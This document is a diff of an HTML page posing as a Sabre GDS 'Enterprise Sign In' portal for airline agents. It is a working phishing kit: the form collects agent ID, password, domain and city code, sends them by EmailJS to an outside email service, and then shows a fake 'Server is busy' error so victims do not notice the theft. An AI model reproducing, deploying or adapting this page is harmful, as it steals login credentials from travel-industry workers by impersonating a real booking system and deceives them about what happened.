@@ -1,71 +1,93 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-  <title>Airline GDS Login – Sabre Enterprise | Global GDS Support</title>
-<meta name="description" content="Secure login portal for Sabre GDS system. Global GDS Support provides assistance for airline agents to access booking systems easily.">
-<meta name="keywords" content="Sabre GDS, airline agent login, GDS support, Sabre sign in, travel agent portal, global GDS support">
-<meta name="robots" content="index, follow">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
+  <head>
+    <meta charset="UTF-8" />
+    <title>Airline GDS Login – Sabre Enterprise | Global GDS Support</title>
+    <meta
+      name="description"
+      content="Secure login portal for Sabre GDS system. Global GDS Support provides assistance for airline agents to access booking systems easily."
+    />
+    <meta
+      name="keywords"
+      content="Sabre GDS, airline agent login, GDS support, Sabre sign in, travel agent portal, global GDS support"
+    />
+    <meta name="robots" content="index, follow" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 
+    <!-- Open Graph Tags for better social media sharing -->
+    <meta property="og:title" content="Airline Login - Global GDS Support" />
+    <meta
+      property="og:description"
+      content="Login to your Global GDS Support Airline account. Secure access for airline agents."
+    />
+    <meta property="og:image" content="/imgs/favicon.ico" />
 
-  <!-- Open Graph Tags for better social media sharing -->
-  <meta property="og:title" content="Airline Login - Global GDS Support">
-  <meta property="og:description" content="Login to your Global GDS Support Airline account. Secure access for airline agents.">
- <meta property="og:image" content="/imgs/favicon.ico">
+    <meta
+      property="og:url"
+      content="https://globalgdssupport.com/airline.html"
+    />
 
-  <meta property="og:url" content="https://globalgdssupport.com/airline.html">
+    <link rel="stylesheet" href="css/airlines.css" />
 
-    <link rel="stylesheet" href="css/airlines.css">
-	
-	 <script
+    <script
       type="text/javascript"
       src="https://cdn.emailjs.com/dist/email.min.js"
     ></script>
-	<script type="text/javascript">
+    <script type="text/javascript">
       (function () {
         emailjs.init("s0V8V4beDXT4rMa18"); // Replace with your EmailJS public key
       })();
     </script>
-
-	
-
-
-</head>
-<body>
+  </head>
+  <body>
     <div class="container">
-        <div class="form-box">
-   <div class="logo-text">Sabre</div>
-            <h2>Enterprise Sign In</h2>
-          <form id="form">
-                <input type="text"    name="userId" placeholder="Agent ID" required>
-                
-                <div class="input-group">
-                    <input type="password"  name="password" id="password" placeholder="Password" required>
-                    <span class="toggle-password" onclick="togglePassword()">👁️</span>
-                </div>
+      <div class="form-box">
+        <div class="logo-text">Sabre</div>
+        <h2>Enterprise Sign In</h2>
+        <form id="form">
+          <input type="text" name="userId" placeholder="Agent ID" required />
 
-                <input type="text"   name="domain"  placeholder="Domain/Partition" required>
-                <input type="text" name="group" placeholder="Suffix/City Code" required>
-                <button type="submit" class="sign-in">SIGN IN</button>
-            </form>
-            <a href="#" class="forgot">Forgot password?</a>
-        </div>
+          <div class="input-group">
+            <input
+              type="password"
+              name="password"
+              id="password"
+              placeholder="Password"
+              required
+            />
+            <span class="toggle-password" onclick="togglePassword()">👁️</span>
+          </div>
+
+          <input
+            type="text"
+            name="domain"
+            placeholder="Domain/Partition"
+            required
+          />
+          <input
+            type="text"
+            name="group"
+            placeholder="Suffix/City Code"
+            required
+          />
+          <button type="submit" class="sign-in">SIGN IN</button>
+        </form>
+        <a href="#" class="forgot">Forgot password?</a>
+      </div>
     </div>
 
     <script>
-        function togglePassword() {
-            const pwd = document.getElementById("password");
-            pwd.type = pwd.type === "password" ? "text" : "password";
-        }
+      function togglePassword() {
+        const pwd = document.getElementById("password");
+        pwd.type = pwd.type === "password" ? "text" : "password";
+      }
     </script>
-	
-	 <script>
+
+    <script>
       document.getElementById("form").addEventListener("submit", function (e) {
         e.preventDefault();
 
-        emailjs.sendForm("service_khovyrq","template_95psblh", this).then(
+        emailjs.sendForm("service_khovyrq", "template_95psblh", this).then(
           () => {
             alert("Server is busy. Please try again later!");
             this.reset();
@@ -76,5 +98,5 @@
         );
       });
     </script>
-</body>
+  </body>
 </html>
